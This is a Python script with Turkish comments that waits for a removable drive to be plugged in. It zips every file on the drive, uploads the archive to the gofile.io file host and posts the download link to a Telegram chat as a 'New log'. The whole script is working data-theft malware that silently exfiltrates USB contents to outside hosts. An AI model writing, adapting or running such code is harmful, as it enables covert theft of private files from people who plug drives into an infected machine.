import os
import zipfile
import subprocess
import gofile
import json
import time
import telegram
import requests
from telegram.ext import Updater, CommandHandler

token = 'BOT-TOKEN'
chat_id = 'YOUR-CHAT-ID'
api_key = 'API-KEY-FROM-GOFILE'

def start(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id, text="Bot started.")

def scan_and_send(bot_token,chat_id,api_key):

    drives = []

    while not drives:
        cmd = 'wmic logicaldisk where "drivetype=2" get caption'
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).decode('utf-8')
        drives = [drive.strip() for drive in output.split()[1:]]

    drive = drives[0]
    if os.path.exists('files.zip'):
        old_size = os.path.getsize('files.zip')
    else:
        old_size = 0

    zip_file_name = "files.zip"
    with zipfile.ZipFile(zip_file_name, "w") as zip_file:
        for folder_name, subfolders, filenames in os.walk(drive):
            for filename in filenames:
                file_path = os.path.join(folder_name, filename)
                zip_file.write(file_path, arcname=os.path.relpath(file_path, drive))

    new_size = os.path.getsize('files.zip')
    if old_size == new_size:
        return

    store = gofile.getServer()['server']
    url = f"https://{store}.gofile.io/uploadFile"
    files = {"file": open(zip_file_name, "rb")}
    params = {"token": api_key}
    response = requests.post(url, files=files, data=params)

    # Yanıtı işle
    if response.status_code == 200:
        print("Dosya başarıyla yüklendi:")
        print(response.json()["data"]["downloadPage"])
        send = response.json()["data"]["downloadPage"]
        message = {
        "chat_id": chat_id,
        "text": f'New log !!! \n Link: {send}'
        }

    response = requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", data=message)

    if response.status_code == 200:
        print("Mesaj başarıyla gönderildi.")
    else:
        print(f"Hata kodu: {response.status_code}")

while True:
    scan_and_send(token,chat_id,api_key)